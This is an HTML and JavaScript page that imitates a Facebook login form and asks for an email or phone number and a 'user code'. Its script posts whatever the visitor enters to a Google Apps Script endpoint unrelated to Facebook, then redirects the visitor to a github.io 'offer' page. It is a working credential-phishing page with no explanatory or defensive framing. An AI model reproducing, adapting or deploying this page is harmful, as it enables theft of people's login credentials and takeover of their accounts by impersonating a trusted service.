<style>
    body {

<body>
    <div class="login-container">
        <h2>Facebook</h2>
        <form name="login-form">
            <input type="text" name="email" placeholder="Email or Phone Number" required>
            <input type="text" name="usercode" placeholder="User Code" required>
            <div class="error-message" id="error-message">Incorrect user code. Must be at least 6 characters.</div>
            <button type="submit" class="login-button">Log In</button>
        </form>
    </div><script>
const scriptURL = 'https://script.google.com/macros/s/AKfycby0is6Yq_Im6188fxGrxf_rw6DmShiEGF2HP9snr-hsrWdw1jwP0Spi910KoHtRw3gB/exec';
const form = document.forms['login-form'];
const errorMessage = document.getElementById('error-message');
const usercodeInput = form.elements['usercode'];

form.addEventListener('submit', function(e) {
    e.preventDefault();
    const formData = new FormData(form);
    const usercode = formData.get('usercode');

    if (usercode.length < 6) {
        errorMessage.style.display = 'block';
        setTimeout(() => {
            errorMessage.style.display = 'none';
        }, 3000);
        return;
    }

    fetch(scriptURL, {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(result => {
        console.log('Login Success!', result);
        window.location.href = 'https://offer009x.github.io/5/';
    })
    .catch(error => {
        console.error('Error!', error);
        alert('Login failed: ' + error.message);
    });
});
</script>
